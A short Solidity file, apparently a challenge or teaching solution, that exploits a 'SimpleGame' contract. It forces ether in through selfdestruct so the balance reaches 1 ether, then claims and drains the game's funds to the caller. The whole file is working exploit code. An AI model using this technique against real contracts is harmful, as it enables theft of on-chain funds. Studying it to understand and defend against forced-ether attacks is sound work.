pragma solidity 0.8.22;

import {SimpleGame} from "./SimpleGame.sol";

contract SelfDestructTransfer {
    constructor(address fundsReceiver) payable {
        selfdestruct(payable(fundsReceiver));
    }
}

contract SimpleGameAttack {
    SimpleGame public simpleGame;

    constructor(address simpleGameAddress) {
        simpleGame = SimpleGame(simpleGameAddress);
    }

    function attack() external payable {
        uint256 amountToSend;
        if (address(simpleGame).balance < 1 ether) {
            amountToSend = 1 ether - address(simpleGame).balance;
        }

        require(msg.value >= amountToSend, "Insufficient Funds");

        new SelfDestructTransfer{value: amountToSend}(address(simpleGame));

        simpleGame.claim();
        require(simpleGame.isFinished(), "Attack failed");
        require(address(simpleGame).balance == 0, "SimpleGame still has funds");
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
